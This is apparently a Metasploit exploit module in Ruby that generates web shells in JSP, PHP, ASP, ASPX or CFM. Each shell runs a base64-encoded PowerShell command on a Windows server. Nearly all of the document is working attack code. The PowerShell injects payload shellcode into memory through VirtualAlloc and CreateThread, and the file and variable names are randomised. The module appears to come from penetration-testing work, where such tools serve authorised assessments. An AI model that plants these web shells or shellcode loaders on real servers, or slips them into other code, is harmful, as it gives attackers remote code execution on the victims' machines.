require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ps_webshells',
			'Description'    => %q{This module will generate a webshell in the language defined by
									the "WEB_LANG" option that passes a base64 encoded PowerShell
									command to the Windows operating system that will execute
									the defined MSF payload.
									This can be a handy way to deliver Metasploit payloads when you
									have the ability to upload arbitrary files to a web server.  The
									txt extension can also be defined in order to write the raw
									PowerShell command to a file for manual execution.},
			'Author'         =>
				[
					'Scott Sutherland "nullbind" <scott.sutherland [at] netspi.com>',
					'Ryan Gandrud "siegemaster" <ryan.gandrud [at] netspi.com>'
				],
			'Platform'      => [ 'win' ],
			'License'        => MSF_LICENSE,
			'References'     => [['URL','http://www.exploit-monday.com/2011_10_16_archive.html']],
			'Platform'       => 'win',
			'DisclosureDate' => 'Oct 10 2011',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[
				OptString.new('WEB_LANG',  [true, 'TXT,JSP,PHP,ASP,ASPX,CFM', 'JSP']),
				OptString.new('TARGET_ARCH',  [true, '64,32', '64']),
				OptString.new('OUT_DIR',  [true, 'output directory', 'c:\\windows\\temp\\']),
			], self.class)
	end

	def exploit

		# Validate architecture variable
		if datastore['TARGET_ARCH'] != "64" and datastore['TARGET_ARCH'] != "32"  then
			print_error("Aborted!  TARGET_ARCH \"#{datastore['TARGET_ARCH']}\" is invalid.\n")
			return
		end

		# Randomly set number of chars in file name
		the_name_len = 3 + rand(10)

		# Randomly set file name
		the_file_name = rand_text_alpha(the_name_len)

		# Display start to users
		print_status("Writing file for msf payload delivery to #{datastore['OUT_DIR']}#{the_file_name}.#{datastore['WEB_LANG']}...")

		# Generate powershell command
		ps_cmd = gen_ps_cmd

		# Generate web shell in specified language
		case datastore['WEB_LANG'].upcase
		when 'JSP'
			output = gen_JSP(ps_cmd)
			ext = "jsp"
		when 'PHP'
			output = gen_PHP(ps_cmd)
			ext = "php"
		when 'ASP'
			output = gen_ASP(ps_cmd)
			ext = "asp"
		when 'ASPX'
			output = gen_ASPX(ps_cmd)
			ext = "aspx"
		when 'CFM'
			output = gen_CFM(ps_cmd)
			ext = "cfm"
		when 'TXT'
			output = ps_cmd
			ext = "txt"
		else
			print_error("Aborted!  Output file type is not supported.\n")
			return
		end

		# Output file to specified location
		File.open(datastore['OUT_DIR'] + "#{the_file_name}.#{ext}", 'wb') { |file| file.write(output)}

		# Get file size
		web_shell_size = File.size(datastore['OUT_DIR'] + "#{the_file_name}.#{ext}")

		# Display end to users
		print_good("#{web_shell_size} byte file written.\n")
		print_status("Module execution complete.\n")

	end


	# ------------------------------
	# Generate powershell payload
	# ------------------------------
	def gen_ps_cmd()

		# Create powershell script that will inject shell code from the selected payload
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)"

		# Unicode encode powershell script
		mytext_uni = Rex::Text.to_unicode(myscript)

		# Base64 encode unicoded script
		mytext_64 = Rex::Text.encode_base64(mytext_uni)

		# Setup path for powershell based on arch
		if datastore['TARGET_ARCH'] == "32" then
			mypath = ""
		else

			# Adjust slashes for txt vs web language output
			if datastore['WEB_LANG'] == "txt" then
				slashery = "\\"
			else
				slashery = "\\\\"
			end
			mypath="C:#{slashery}windows#{slashery}syswow64#{slashery}WindowsPowerShell#{slashery}v1.0#{slashery}"
		end

		# Create powershell command to be executed
		ps_cmd = "#{mypath}powershell.exe -noexit -noprofile -encodedCommand #{mytext_64}"

		return ps_cmd
	end


	# ------------------------------
	# Generate jsp web shell
	# ------------------------------
	def gen_JSP(ps_cmd)

		# Randomly set the var len
		the_var_len = 3 + rand(10)

		# Randomly set variable name
		jsp_var_name = rand_text_alpha(the_var_len)

		# Generate JSP script
		script = "<%
		Process #{jsp_var_name} = Runtime.getRuntime().exec(\"cmd.exe /c \" + \"#{ps_cmd}\");
%>"
	end


	# ------------------------------
	# Generate php web shell
	# ------------------------------
	def gen_PHP(ps_cmd)

		# Generate PHP script
		script = "<?php
	system(\'cmd.exe /c \' . \'#{ps_cmd}|echo 1>nul\');
?>"
	end


	# ------------------------------
	# Generate asp web shell
	# ------------------------------
	def gen_ASP(ps_cmd)

		# Randomly set the var len
		the_var_len = 3 + rand(10)

		# Randomly set variable name
		asp_var_name = rand_text_alpha(the_var_len)

		# Generate ASP script
		script = "<%
	set #{asp_var_name} = CreateObject(\"WScript.Shell\")
	#{asp_var_name}.run \"cmd.exe /c #{ps_cmd}\"
%>"
	end


	# ------------------------------
	# Generate aspx web shell
	# ------------------------------
	def gen_ASPX(ps_cmd)

		# Randomly set variable name 1
		the_var_len = 3 + rand(10)
		aspx_var_name1 = rand_text_alpha(the_var_len)

		# Randomly set variable name 2
		the_var_len = 3 + rand(10)
		aspx_var_name2 = rand_text_alpha(the_var_len)

		# Randomly set variable name 3
		the_var_len = 3 + rand(10)
		aspx_var_name3 = rand_text_alpha(the_var_len)

		# Generate ASPX script
		script = "<%@ Page Language=\"VB\" Debug=\"true\" %>
<%@ import Namespace=\"system.IO\" %>
<%@ import Namespace=\"System.Diagnostics\" %>

<script runat=\"server\">

Sub #{aspx_var_name1}(Src As Object, E As EventArgs)
	Dim #{aspx_var_name2} As New Process()
	Dim #{aspx_var_name3} As New ProcessStartInfo(\"cmd.exe\")
	#{aspx_var_name3}.Arguments=\"/c #{ps_cmd}\"
	#{aspx_var_name2}.StartInfo = #{aspx_var_name3}
	#{aspx_var_name2}.Start()
End Sub

</script>

<html onload=\"#{aspx_var_name1}\" runat=\"server\">
</html>"
	end


	# ------------------------------
	# Generate cfm web shell
	# ------------------------------
	def gen_CFM(ps_cmd)

		# Randomly set variable name 1
		the_var_len = 3 + rand(10)
		cfm_var_name1 = rand_text_alpha(the_var_len)

		# Randomly set variable name 2
		the_var_len = 3 + rand(10)
		cfm_var_name2 = rand_text_alpha(the_var_len)

		# Randomly set variable name 3
		the_var_len = 3 + rand(10)
		cfm_var_name3 = rand_text_alpha(the_var_len)

		# Generate cfm script
		script = "<html>
<body>
<cfoutput>
<table>
<form method=\"POST\" action=\"\">
	<tr>
		<td>Timeout:</td>
		<td>< input type=text name=\"timeout\" size=4 <cfif isdefined(\"form.timeout\")> value=\"#form.timeout#\" <cfelse> value=\"5\" </cfif> > </td>
	</tr>
</table>
<input type=submit value=\"Exec\" >
</FORM>

<cfsavecontent variable=\"#{cfm_var_name1}\">
<cfexecute name = \"C:\\Windows\\System32\\cmd.exe\" arguments = \"/c #{ps_cmd}\" timeout = \"#Form.timeout#\">
</cfexecute>
</cfsavecontent>
<pre>
##{cfm_var_name1}#
</pre>
</cfoutput>
</body>
</html>"
	end

end
